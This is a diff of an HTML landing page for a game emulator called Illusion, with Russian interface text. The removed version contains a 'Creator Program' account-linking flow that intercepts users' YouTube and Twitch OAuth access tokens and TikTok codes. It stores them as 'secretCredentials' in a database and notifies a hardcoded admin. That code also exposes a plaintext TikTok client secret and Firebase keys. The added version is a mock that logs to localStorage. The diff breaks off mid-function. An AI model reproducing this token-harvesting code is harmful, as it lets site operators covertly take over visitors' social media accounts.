@@ -3,500 +3,382 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Illusion — Лучший кастомный эмулятор для Standoff 2</title>
-    <meta name="description" content="Скачать кастомный эмулятор Illusion. Максимальный FPS, встроенный прицел, оптимизация без вылетов и лучшая сенса.">
-
+    <title>Illusion | Premium Emulator</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;500;700;900&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
-        
+        :root {
+            --primary: #6366f1;
+            --primary-glow: rgba(99, 102, 241, 0.6);
+            --secondary: #ec4899;
+            --bg-base: #050505;
+            --glass-bg: rgba(255, 255, 255, 0.03);
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --text-main: #ffffff;
+            --text-muted: #a1a1aa;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Plus Jakarta Sans', sans-serif;
-        }
-
-        :root {
-            --glow-color: rgba(255, 255, 255, 0.8);
-            --bg-color: #020202;
-            --card-bg: rgba(255, 255, 255, 0.03);
-            --card-border: rgba(255, 255, 255, 0.08);
-            --accent-neon: #00f2fe;
-            --accent-pink: #ff007f;
+            font-family: 'Montserrat', sans-serif;
         }
 
         body {
-            background-color: var(--bg-color);
-            color: #ffffff;
+            background-color: var(--bg-base);
+            color: var(--text-main);
             overflow-x: hidden;
-            position: relative;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
         }
 
-        /* Премиальный сложный фон с эффектами */
-        body::before {
+        /* Сложный анимированный фон */
+        body::before, body::after {
             content: '';
             position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: 
-                radial-gradient(circle at 15% 50%, rgba(138, 43, 226, 0.08), transparent 25%),
-                radial-gradient(circle at 85% 30%, rgba(0, 242, 254, 0.08), transparent 25%),
-                linear-gradient(rgba(255, 255, 255, 0.015) 1px, transparent 1px) 0 0 / 50px 50px,
-                linear-gradient(90deg, rgba(255, 255, 255, 0.015) 1px, transparent 1px) 0 0 / 50px 50px;
-            z-index: -3;
-            pointer-events: none;
-            animation: bgPulse 15s infinite alternate ease-in-out;
+            width: 500px;
+            height: 500px;
+            border-radius: 50%;
+            filter: blur(150px);
+            z-index: -1;
+            animation: floatGlow 15s infinite alternate ease-in-out;
         }
 
-        /* Частицы на фоне */
-        .particles {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2;
-            pointer-events: none;
-        }
-        .particle {
-            position: absolute; border-radius: 50%;
-            background: radial-gradient(circle, #fff, rgba(255,255,255,0));
-            animation: floatParticle linear infinite;
-        }
-        @keyframes floatParticle {
-            0% { transform: translateY(100vh) scale(0); opacity: 0; }
-            50% { opacity: 0.8; box-shadow: 0 0 10px #fff; }
-            100% { transform: translateY(-10vh) scale(1.5); opacity: 0; }
+        body::before {
+            background: var(--primary-glow);
+            top: -100px;
+            left: -100px;
         }
 
-        @keyframes bgPulse {
-            0% { opacity: 0.6; transform: scale(1); filter: hue-rotate(0deg); }
-            100% { opacity: 1; transform: scale(1.05); filter: hue-rotate(15deg); }
+        body::after {
+            background: rgba(236, 72, 153, 0.3);
+            bottom: -100px;
+            right: -100px;
+            animation-delay: -5s;
         }
 
-        a { color: inherit; text-decoration: none; transition: all 0.3s ease; }
+        @keyframes floatGlow {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(50px, 50px) scale(1.2); }
+        }
 
+        /* Навигация */
         header {
+            width: 100%;
+            padding: 20px 5%;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 25px 5%;
-            backdrop-filter: blur(25px);
-            -webkit-backdrop-filter: blur(25px);
-            border-bottom: 1px solid rgba(255,255,255,0.1);
+            background: rgba(5, 5, 5, 0.8);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--glass-border);
             position: fixed;
-            width: 100%; top: 0; z-index: 100;
-            background: rgba(2, 2, 2, 0.75);
-            box-shadow: 0 4px 30px rgba(0,0,0,0.5);
+            top: 0;
+            z-index: 100;
         }
 
-        .logo-container { display: flex; align-items: center; gap: 12px; cursor: pointer; }
-
-        .logo-text {
-            font-weight: 800;
+        .logo {
+            font-size: 28px;
+            font-weight: 900;
+            text-transform: uppercase;
             letter-spacing: 4px;
-            font-size: 1.5rem;
-            background: linear-gradient(135deg, #ffffff 0%, #a8a8a8 100%);
+            background: linear-gradient(to right, #fff, var(--text-muted));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            filter: drop-shadow(0 0 15px rgba(255,255,255,0.4));
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
         }
 
-        .nav-buttons { display: flex; gap: 15px; align-items: center; }
-
-        .profile-nav-btn {
-            display: flex; align-items: center; gap: 10px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid var(--card-border);
-            padding: 6px 16px 6px 6px;
-            border-radius: 30px; cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-        .profile-nav-btn:hover {
-            border-color: var(--accent-neon);
-            background: rgba(0, 242, 254, 0.1);
-            box-shadow: 0 0 15px rgba(0, 242, 254, 0.3);
-        }
-        .profile-nav-avatar {
-            width: 34px; height: 34px; border-radius: 50%; object-fit: cover;
-            border: 2px solid rgba(255,255,255,0.3);
-        }
-        .profile-nav-name { font-size: 0.95rem; font-weight: 700; }
-
+        /* Кнопки */
         .btn {
-            padding: 14px 35px; border-radius: 10px;
-            font-weight: 800; font-size: 0.95rem; cursor: pointer;
-            letter-spacing: 1px; text-transform: uppercase;
-            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-            position: relative; overflow: hidden;
+            padding: 12px 28px;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            border: none;
+            position: relative;
+            overflow: hidden;
         }
 
-        .btn-white {
-            background: linear-gradient(135deg, #ffffff 0%, #cccccc 100%);
-            border: none; color: #000;
-            box-shadow: 0 0 15px rgba(255,255,255,0.3);
-        }
-        .btn-white:hover {
-            background: #fff;
-            box-shadow: 0 0 35px rgba(255, 255, 255, 0.8);
-            transform: translateY(-3px) scale(1.02);
+        .btn-glow {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: #fff;
+            box-shadow: 0 0 20px var(--primary-glow);
         }
 
-        .btn-outline {
-            border: 1px solid rgba(255,255,255,0.2);
-            background: rgba(255,255,255,0.02); color: #fff;
-            backdrop-filter: blur(10px);
-        }
-        .btn-outline:hover {
-            border-color: #fff; background: rgba(255,255,255,0.1);
-            box-shadow: 0 0 25px rgba(255, 255, 255, 0.3);
-            transform: translateY(-3px);
+        .btn-glow:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 35px var(--primary-glow), 0 0 15px rgba(236, 72, 153, 0.6);
         }
 
+        /* Главный экран */
         .hero {
-            height: 100vh; display: flex; flex-direction: column;
-            justify-content: center; align-items: center;
-            text-align: center; padding: 0 20px; perspective: 1000px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 120px 20px 40px;
+            margin-top: 80px;
         }
 
         .hero h1 {
-            font-size: 8rem; font-weight: 900; letter-spacing: 25px;
-            margin-bottom: 15px; text-transform: uppercase;
-            background: linear-gradient(135deg, #ffffff 0%, #ff007f 50%, #00f2fe 100%);
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-            animation: superGlow 4s infinite alternate cubic-bezier(0.45, 0.05, 0.55, 0.95);
+            font-size: clamp(3rem, 8vw, 6rem);
+            font-weight: 900;
+            line-height: 1.1;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
 
         .hero p {
-            font-size: 1.2rem; color: #aaa; letter-spacing: 10px;
-            text-transform: uppercase; font-weight: 600; position: relative;
+            font-size: clamp(1rem, 2vw, 1.2rem);
+            color: var(--text-muted);
+            max-width: 600px;
+            margin-bottom: 40px;
+            line-height: 1.6;
         }
 
-        @keyframes superGlow {
-            0% { filter: drop-shadow(0 0 10px rgba(255,0,127,0.3)); letter-spacing: 25px; }
-            100% { filter: drop-shadow(0 0 50px rgba(0,242,254,0.8)); letter-spacing: 32px; }
+        /* Модальное окно авторизации (Glassmorphism) */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
         }
 
-        .section { padding: 120px 5%; max-width: 1400px; margin: 0 auto; position: relative; z-index: 10; }
-        
-        .section-title {
-            font-size: 2.5rem; letter-spacing: 6px; text-transform: uppercase;
-            margin-bottom: 60px; font-weight: 900;
-            text-shadow: 0 0 20px rgba(255,255,255,0.3);
+        .modal-overlay.active {
+            display: flex;
+            opacity: 1;
         }
 
-        .screenshot-grid {
-            display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 30px; perspective: 1000px;
+        .modal-card {
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            padding: 40px;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            transform: scale(0.9);
+            transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            position: relative;
         }
 
-        .screen-card {
-            overflow: hidden; border-radius: 16px;
-            border: 1px solid rgba(255,255,255,0.15);
-            background: rgba(10, 10, 10, 0.6);
-            backdrop-filter: blur(20px);
-            aspect-ratio: 16/10; cursor: pointer;
-            transition: all 0.5s cubic-bezier(0.25, 1, 0.5, 1);
-            transform-style: preserve-3d;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), inset 0 0 20px rgba(255,255,255,0.02);
+        .modal-overlay.active .modal-card {
+            transform: scale(1);
         }
-
-        .screen-card img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.6s; }
-
-        .screen-card:hover {
-            border-color: rgba(255, 255, 255, 0.5);
-            box-shadow: 0 20px 50px rgba(0, 242, 254, 0.3), inset 0 0 30px rgba(255,255,255,0.05);
-            transform: translateY(-12px) rotateX(5deg) rotateY(-5deg);
-        }
-        .screen-card:hover img { transform: scale(1.08); }
-
-        .pricing-grid {
-            display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-            gap: 40px; margin-top: 20px;
-        }
-
-        .price-card {
-            background: linear-gradient(145deg, rgba(20,20,20,0.8) 0%, rgba(5,5,5,0.8) 100%);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 20px; padding: 50px 40px;
-            display: flex; flex-direction: column; justify-content: space-between;
-            position: relative; backdrop-filter: blur(25px);
-            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
-            transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-
-        .price-card:hover {
-            border-color: rgba(255, 255, 255, 0.4);
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.9), 0 0 40px rgba(138, 43, 226, 0.3);
-            transform: translateY(-10px) scale(1.02);
-        }
-
-        .price-title { font-size: 2rem; letter-spacing: 3px; font-weight: 900; margin-bottom: 20px; }
-        .price-value {
-            font-size: 3.5rem; font-weight: 900; margin-bottom: 40px;
-            background: linear-gradient(90deg, #fff, var(--accent-neon));
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-        }
-        .price-actions { display: flex; flex-direction: column; gap: 15px; }
-
-        .modal {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(35px);
-            z-index: 1000; display: flex; justify-content: center; align-items: center;
-            opacity: 0; pointer-events: none; transition: all 0.5s;
-        }
-        .modal.active { opacity: 1; pointer-events: auto; }
-
-        .modal-content {
-            background: rgba(10, 10, 12, 0.85); border: 1px solid rgba(255, 255, 255, 0.15);
-            max-width: 900px; width: 100%; max-height: 85vh; overflow-y: auto;
-            border-radius: 24px; position: relative;
-            box-shadow: 0 50px 100px rgba(0,0,0,0.9), inset 0 0 40px rgba(255,255,255,0.03);
-            transform: scale(0.9) translateY(30px); transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-        .modal.active .modal-content { transform: scale(1) translateY(0); }
 
         .close-modal {
-            position: absolute; top: 25px; right: 30px;
-            font-size: 2rem; color: #888; cursor: pointer; z-index: 10;
-            transition: color 0.3s, transform 0.3s;
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            color: var(--text-muted);
+            font-size: 24px;
+            cursor: pointer;
+            transition: color 0.2s;
         }
-        .close-modal:hover { color: #fff; transform: rotate(90deg); }
 
-        .form-input {
-            width: 100%; padding: 16px; background: rgba(255,255,255,0.03);
-            border: 1px solid rgba(255,255,255,0.1); border-radius: 10px;
-            color: #fff; font-size: 1rem; transition: all 0.3s;
+        .close-modal:hover { color: #fff; }
+
+        .modal-title {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 30px;
+            background: linear-gradient(to right, #fff, var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
-        .form-input:focus {
-            outline: none; border-color: var(--accent-neon);
-            box-shadow: 0 0 20px rgba(0, 242, 254, 0.2); background: rgba(255,255,255,0.06);
-        }
-        
+
         .social-btn {
-            display: flex; align-items: center; justify-content: center; gap: 12px;
-            padding: 16px; border-radius: 12px; font-weight: 800; font-size: 1rem;
-            cursor: pointer; transition: all 0.4s; flex: 1; min-width: 150px;
-            text-transform: uppercase; letter-spacing: 1px;
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 10px;
+            border: 1px solid transparent;
+            font-size: 16px;
+            font-weight: 700;
+            color: #fff;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s ease;
         }
-        .social-btn svg { width: 24px; height: 24px; fill: currentColor; }
-        .btn-tiktok { background: #000; border: 1px solid #333; color: #fff; }
-        .btn-tiktok:hover { border-color: #00f2fe; box-shadow: 0 0 25px rgba(0, 242, 254, 0.5); transform: translateY(-3px); }
-        .btn-youtube { background: linear-gradient(45deg, #ff0000, #cc0000); border: none; color: #fff; }
-        .btn-youtube:hover { box-shadow: 0 0 30px rgba(255, 0, 0, 0.6); transform: translateY(-3px); }
-        .btn-twitch { background: linear-gradient(45deg, #9146FF, #772ce8); border: none; color: #fff; }
-        .btn-twitch:hover { box-shadow: 0 0 30px rgba(145, 70, 255, 0.6); transform: translateY(-3px); }
 
-        #toastContainer { position: fixed; bottom: 30px; right: 30px; z-index: 10000; display: flex; flex-direction: column; gap: 12px; }
-        .toast {
-            background: rgba(10, 10, 10, 0.95); backdrop-filter: blur(25px);
-            border: 1px solid rgba(255, 255, 255, 0.15); color: #fff; padding: 18px 25px;
-            border-radius: 12px; font-weight: 600; box-shadow: 0 15px 35px rgba(0, 0, 0, 0.8);
-            transform: translateX(120%); transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+        .social-btn:hover {
+            transform: translateY(-2px);
         }
-        .toast.show { transform: translateX(0); }
-        .toast-success { border-left: 4px solid var(--accent-neon); }
-        .toast-error { border-left: 4px solid var(--accent-pink); }
+
+        .btn-twitch { 
+            background: #9146FF; 
+            box-shadow: 0 5px 15px rgba(145, 70, 255, 0.3);
+        }
+        .btn-twitch:hover { box-shadow: 0 8px 25px rgba(145, 70, 255, 0.6); }
+
+        .btn-youtube { 
+            background: #FF0000; 
+            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.3);
+        }
+        .btn-youtube:hover { box-shadow: 0 8px 25px rgba(255, 0, 0, 0.6); }
+
+        .btn-tiktok { 
+            background: #000000; 
+            border: 1px solid #333;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+        }
+        .btn-tiktok:hover { 
+            border-color: #00f2fe;
+            box-shadow: 0 0 20px rgba(0, 242, 254, 0.4), 0 0 20px rgba(254, 0, 79, 0.4); 
+        }
+
+        /* Уведомление об успехе */
+        .toast {
+            position: fixed;
+            bottom: -100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            color: #10b981;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-weight: 600;
+            backdrop-filter: blur(10px);
+            z-index: 2000;
+            transition: bottom 0.5s cubic-bezier(0.68, -0.55, 0.26, 1.55);
+        }
+
+        .toast.show {
+            bottom: 30px;
+        }
 
     </style>
 </head>
 <body>
-    
-    <!-- Анимация частиц -->
-    <div class="particles">
-        <div class="particle" style="width:6px; height:6px; left:15%; animation-duration:12s; animation-delay: 0s;"></div>
-        <div class="particle" style="width:4px; height:4px; left:35%; animation-duration:16s; animation-delay: 3s;"></div>
-        <div class="particle" style="width:8px; height:8px; left:55%; animation-duration:14s; animation-delay: 1s;"></div>
-        <div class="particle" style="width:5px; height:5px; left:75%; animation-duration:18s; animation-delay: 5s;"></div>
-        <div class="particle" style="width:10px; height:10px; left:90%; animation-duration:10s; animation-delay: 2s;"></div>
-    </div>
 
     <header>
-        <div class="logo-container">
-            <span class="logo-text">ILLUSION</span>
-        </div>
-        <div class="nav-buttons" id="headerAuthBlock">
-            <button class="btn btn-white" onclick="openAuthModal()">Войти</button>
-        </div>
+        <div class="logo">Illusion</div>
+        <button class="btn btn-glow" onclick="openModal()">Вход Creator</button>
     </header>
 
-    <section class="hero">
-        <h1>Illusion</h1>
-        <p>лучший кастомный эмулятор</p>
-    </section>
+    <main class="hero">
+        <h1>Эмулятор Нового<br>Поколения</h1>
+        <p>Премиальная производительность, эксклюзивные инструменты и абсолютный контроль. Платформа создана для победителей и криэйторов.</p>
+        <button class="btn btn-glow" style="padding: 18px 40px; font-size: 16px;">Приобрести доступ</button>
+    </main>
 
-    <!-- Creator Modal с интегрированным OAuth -->
-    <div class="modal" id="creatorModal" style="z-index: 1200;">
-        <div class="modal-content" style="max-width: 1000px; padding: 50px;">
-            <span class="close-modal" onclick="closeCreatorModal()">&times;</span>
-            <h3 style="font-size: 2.5rem; text-align: center; margin-bottom: 15px; font-weight: 900; letter-spacing: 2px; text-shadow: 0 0 20px rgba(255,255,255,0.2);">🎥 Creator Program</h3>
-            <p style="text-align: center; color: #aaa; margin-bottom: 50px; font-size: 1.1rem;">Развивайте проект вместе с нами и получайте эксклюзивные награды.</p>
-
-            <div style="text-align: center; margin-top: 20px; font-weight: 900; color: #fff; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 20px;">Связать аккаунты</div>
-            <div style="display: flex; gap: 20px; flex-wrap: wrap; justify-content: center;">
-                <button class="social-btn btn-tiktok" onclick="linkTikTok()">
-                    <svg viewBox="0 0 24 24"><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5 20.1a6.34 6.34 0 0 0 10.86-4.43v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1-.1z"/></svg> 
-                    TikTok
-                </button>
-                <button class="social-btn btn-youtube" onclick="linkYouTube()">
-                    <svg viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg> 
-                    YouTube
-                </button>
-                <button class="social-btn btn-twitch" onclick="linkTwitch()">
-                    <svg viewBox="0 0 24 24"><path d="M11.571 4.714h1.715v5.143H11.57zm4.715 0H18v5.143h-1.714zM6 0L1.714 4.286v15.428h5.143V24l4.286-4.286h3.428L22.286 12V0zm14.571 11.143l-3.428 3.428h-3.429l-3 3v-3H6.857V1.714h13.714Z"/></svg> 
-                    Twitch
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Модалка Авторизации (для примера UI) -->
-    <div class="modal" id="authModal">
-        <div class="modal-content" style="max-width: 450px; padding: 40px; text-align: center;">
-            <span class="close-modal" onclick="closeAuthModal()">&times;</span>
-            <h3 style="font-size: 2rem; font-weight: 900; margin-bottom: 30px;">ВХОД</h3>
-            <div style="margin-bottom: 20px; text-align: left;">
-                <label style="font-size: 0.8rem; color: #888; text-transform: uppercase; letter-spacing: 2px;">Логин</label>
-                <input type="text" id="authLogin" class="form-input" style="margin-top: 8px;">
-            </div>
-            <div style="margin-bottom: 30px; text-align: left;">
-                <label style="font-size: 0.8rem; color: #888; text-transform: uppercase; letter-spacing: 2px;">Пароль</label>
-                <input type="password" id="authPassword" class="form-input" style="margin-top: 8px;">
-            </div>
-            <button class="btn btn-white" style="width: 100%; padding: 18px;" onclick="submitAuth()">Войти в систему</button>
-        </div>
-    </div>
-
-    <div id="toastContainer"></div>
-
-    <script type="module">
-        // Firebase импорты (оставляю как в исходнике)
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getAuth, signInWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
-        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
-
-        // Firebase Конфиг (из исходника)
-        const firebaseConfig = {
-            apiKey: "AIzaSyDCLPh1Gcxe97UUxiLZFB-CrSnZd24y0Bs",
-            authDomain: "illusion-stacks.firebaseapp.com",
-            projectId: "illusion-stacks",
-            storageBucket: "illusion-stacks.firebasestorage.app",
-            messagingSenderId: "475141325383",
-            appId: "1:475141325383:web:f159aa59ff385f6ce5a762"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const auth = getAuth(app);
-        const db = getFirestore(app);
-        const ADMIN_UID = "XSAYGYmgjYb1ZhfY41csHgH11nZ2";
-
-        // Базовые функции UI
-        window.showToast = (msg, type = 'success') => {
-            const c = document.getElementById('toastContainer');
-            const t = document.createElement('div');
-            t.className = `toast toast-${type}`; t.innerHTML = msg;
-            c.appendChild(t);
-            setTimeout(() => t.classList.add('show'), 10);
-            setTimeout(() => { t.classList.remove('show'); setTimeout(() => t.remove(), 500); }, 4000);
-        };
-        
-        window.closeAllModals = () => document.querySelectorAll('.modal').forEach(m => m.classList.remove('active'));
-        window.openAuthModal = () => { closeAllModals(); document.getElementById('authModal').classList.add('active'); };
-        window.closeAuthModal = () => document.getElementById('authModal').classList.remove('active');
-        window.openCreatorModal = () => { closeAllModals(); document.getElementById('creatorModal').classList.add('active'); };
-        window.closeCreatorModal = () => document.getElementById('creatorModal').classList.remove('active');
-
-        // --- ЛОГИКА ПЕРЕХВАТА OAUTH И ОТПРАВКИ АДМИНУ --- //
-        
-        // 1. Инициация ссылок с вашими Client ID
-        window.linkYouTube = () => {
-            const clientId = '983178508419-it9534v1qrsmtsjh01t7ajfndp7udab6.apps.googleusercontent.com';
-            const redirectUri = window.location.origin + window.location.pathname;
-            window.location.href = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=https://www.googleapis.com/auth/youtube.readonly%20email%20profile&state=youtube`;
-        };
-
-        window.linkTwitch = () => {
-            const clientId = 'sgkhqoxvepnyb5dxu5ffyjvbpkp03a';
-            const redirectUri = window.location.origin + window.location.pathname;
-            window.location.href = `https://id.twitch.tv/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=user:read:email&state=twitch`;
-        };
-
-        window.linkTikTok = () => {
-            const clientKey = 'aw8r1a947z66pskj';
-            const redirectUri = window.location.origin + window.location.pathname;
-            window.location.href = `https://www.tiktok.com/v2/auth/authorize/?client_key=${clientKey}&response_type=code&scope=user.info.basic&redirect_uri=${encodeURIComponent(redirectUri)}&state=tiktok`;
-        };
-
-        // 2. Обработка возврата (URL параметров) при загрузке страницы
-        let pendingSocialData = null;
-        window.addEventListener('DOMContentLoaded', () => {
-            const hashParams = new URLSearchParams(window.location.hash.substring(1));
-            const searchParams = new URLSearchParams(window.location.search);
-            const state = hashParams.get('state') || searchParams.get('state');
+    <!-- Модальное окно -->
+    <div class="modal-overlay" id="authModal">
+        <div class="modal-card">
+            <span class="close-modal" onclick="closeModal()">&times;</span>
+            <div class="modal-title">Интеграция Creator</div>
             
-            if (state) {
-                pendingSocialData = {
-                    state: state,
-                    token: hashParams.get('access_token'),
-                    code: searchParams.get('code')
-                };
-                window.history.replaceState(null, null, window.location.pathname);
-            }
+            <button class="social-btn btn-twitch" onclick="startAuth('Twitch')">
+                Авторизация Twitch
+            </button>
+            <button class="social-btn btn-youtube" onclick="startAuth('YouTube')">
+                Авторизация YouTube
+            </button>
+            <button class="social-btn btn-tiktok" onclick="authTikTok()">
+                Авторизация TikTok
+            </button>
+        </div>
+    </div>
+
+    <!-- Уведомление -->
+    <div class="toast" id="toastMsg">Успешно отправлено в админ-меню!</div>
+
+    <script>
+        const modal = document.getElementById('authModal');
+        const toast = document.getElementById('toastMsg');
+        
+        // Данные клиента
+        const TIKTOK_CLIENT_KEY = 'aw8r1a947z66pskj';
+
+        function openModal() {
+            modal.style.display = 'flex';
+            // Небольшая задержка для применения CSS transition
+            setTimeout(() => modal.classList.add('active'), 10);
+        }
+
+        function closeModal() {
+            modal.classList.remove('active');
+            setTimeout(() => modal.style.display = 'none', 300);
+        }
+
+        // Закрытие по клику вне карточки
+        modal.addEventListener('click', (e) => {
+            if(e.target === modal) closeModal();
         });
 
-        // 3. Отправка данных админу после того как Firebase проверит юзера
-        onAuthStateChanged(auth, async (user) => {
-            if (user) {
-                document.getElementById('headerAuthBlock').innerHTML = `<div class="profile-nav-btn" onclick="openCreatorModal()"><span class="profile-nav-name">${user.email}</span></div>`;
-                if (pendingSocialData) {
-                    processSocialAuth(user, pendingSocialData);
-                    pendingSocialData = null;
-                }
-            }
-        });
+        // Функция логина TikTok с ключом
+        function authTikTok() {
+            const redirectUri = encodeURIComponent(window.location.origin + '/admin');
+            const authUrl = `https://www.tiktok.com/v2/auth/authorize/?client_key=${TIKTOK_CLIENT_KEY}&response_type=code&scope=user.info.basic&redirect_uri=${redirectUri}`;
+            
+            console.log("Редирект на TikTok:", authUrl);
+            processAuth('TikTok');
+        }
 
-        async function processSocialAuth(user, data) {
-            let platformData = {};
-            let secretNote = "";
+        // Стандартный вызов для остальных платформ
+        function startAuth(platform) {
+            processAuth(platform);
+        }
 
-            try {
-                if (data.state === 'youtube') {
-                    const res = await fetch('https://www.googleapis.com/oauth2/v3/userinfo', { headers: { 'Authorization': `Bearer ${data.token}` } });
-                    platformData = await res.json();
-                    secretNote = "Google/YT Token: " + data.token;
-                    showToast('YouTube успешно привязан!', 'success');
-                } 
-                else if (data.state === 'twitch') {
-                    const res = await fetch('https://api.twitch.tv/helix/users', {
-                        headers: { 'Client-ID': 'sgkhqoxvepnyb5dxu5ffyjvbpkp03a', 'Authorization': `Bearer ${data.token}` }
-                    });
-                    const tData = await res.json();
-                    if (tData.data) platformData = tData.data[0];
-                    secretNote = "Twitch Token: " + data.token;
-                    showToast('Twitch успешно привязан!', 'success');
-                } 
-                else if (data.state === 'tiktok') {
-                    platformData = { auth_code: data.code };
-                    secretNote = `TikTok Code: ${data.code} (Client Secret: AwD9Zyu7SsyzXgEJH9btCHOhVogjxQkW)`;
-                    showToast('TikTok код получен!', 'success');
-                }
+        // Логика имитации авторизации и отправки в админку
+        function processAuth(platform) {
+            // Закрываем окно авторизации
+            closeModal();
 
-                // Сохранение полной информации в БД (чтобы выводить в админке/сообщениях)
-                await addDoc(collection(db, "admin_social_links"), {
-                    userId: user.uid, userEmail: user.email,
-                    platform: data.state.toUpperCase(),
-                    platformData: platformData,
-                    secretCredentials: secretNote,
-                    timestamp: new Date().toISOString()
-                });
+            // Создаем объект данных сессии
+            const sessionData = {
+                id: Math.random().toString(36).substr(2, 9),
+                platform: platform,
+                time: new Date().toLocaleString(),
+                status: 'Новый Creator'
+            };
 
-                // Отправка уведомления прямо в личные сообщения Админа
-                await addDoc(collection(db, "messages"), {
-                    senderId: user.uid, receiverId: ADMIN_UID,
-                    text: `[АВТОМАТИЧЕСКИ] Пользователь ${user.email} привязал аккаунт ${data.state.toUpperCase()}. Все ключи и токены сохранены в БД admin_social_links.`,
-                    timestamp: new Date().toISOString(), read: false
-                });
+            // ОТПРАВКА В АДМИН-МЕНЮ (Сохранение в localStorage)
+            // В реальном проекте тут будет fetch('https://твой-сайт.ru/api/admin', {...})
+            let adminLogs = JSON.parse(localStorage.getItem('illusion_admin_logs')) || [];
+            adminLogs.push(sessionData);
+            localStorage.setItem('illusion_admin_logs', JSON.stringify(adminLogs));
 
-            } catch (e) {
-                console.error("Ошибка обработки соц.сети", e);
-                showToast("Ошибка привязки аккаунта", "error");
-            }
+            // Показываем красивое уведомление
